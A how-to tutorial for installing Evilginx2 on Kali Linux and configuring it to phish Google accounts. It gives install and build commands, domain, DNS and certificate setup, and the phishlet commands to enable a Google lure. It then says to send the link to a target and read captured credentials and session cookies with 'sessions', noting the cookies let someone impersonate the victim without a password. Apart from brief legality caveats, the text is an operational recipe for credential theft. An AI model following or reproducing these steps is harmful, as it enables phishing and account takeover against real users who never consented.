Step 1: Update Kali Linux

Ensure your Kali Linux system is up-to-date:

sudo apt update && sudo apt upgrade -y

Step 2: Install Dependencies

Evilginx requires some dependencies to run. Install these by running:

sudo apt install git make gcc libpcap-dev golang -y

Step 3: Set Up Go Environment

Evilginx is written in Go, so you need to set up the Go environment. If Go is already installed, you can skip this step.

To check if Go is installed:

go version

If it’s not installed, download it using:

wget https://go.dev/dl/go1.21.1.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.21.1.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc

Verify the installation:

go version

Step 4: Clone the Evilginx Repository

Clone Evilginx from GitHub:

git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2

Step 5: Build and Install Evilginx

Now, build Evilginx:

make
sudo make install

Step 6: Set Up Domain and SSL Certificate

To use Evilginx effectively, you'll need a domain and an SSL certificate. Evilginx requires a domain with DNS A records pointing to your server’s IP address.
Configure the Domain:

    Buy a domain or use an existing one.
    Go to your domain registrar’s settings and add a DNS A record that points to your Kali Linux server’s IP address.

Install and Configure Let's Encrypt SSL Certificate:

Evilginx can automatically obtain SSL certificates via Let's Encrypt. To set it up:

    Start Evilginx:

    sudo evilginx

    Configure the SSL certificate by following the prompts within Evilginx to obtain a certificate for your domain.

Step 7: Set Up Phishing Templates

Evilginx uses pre-configured templates for different services, such as Gmail or Facebook. You’ll need to load or create the templates for the service you’re targeting. Many template files can be found online, but use caution and be mindful of legality.

To load a phishing template (e.g., for Google):

config domain yourdomain.com
config ip yourserverip
phishlets hostname google yourphishingdomain.com
phishlets enable google

    Replace yourdomain.com and yourphishingdomain.com with the actual domain names you set up.

Step 8: Run Evilginx and Capture Credentials

Once configured, Evilginx will begin listening for login requests.

    Share the phishing link (e.g., yourphishingdomain.com) with the target (only if it's ethical and legal).
    Evilginx will capture any login credentials or session cookies entered on the page, which can be used to simulate a session without needing the password.

To view captured credentials, run:

sessions

Step 9: Stop Evilginx

When done, stop Evilginx by pressing CTRL+C or closing the terminal.
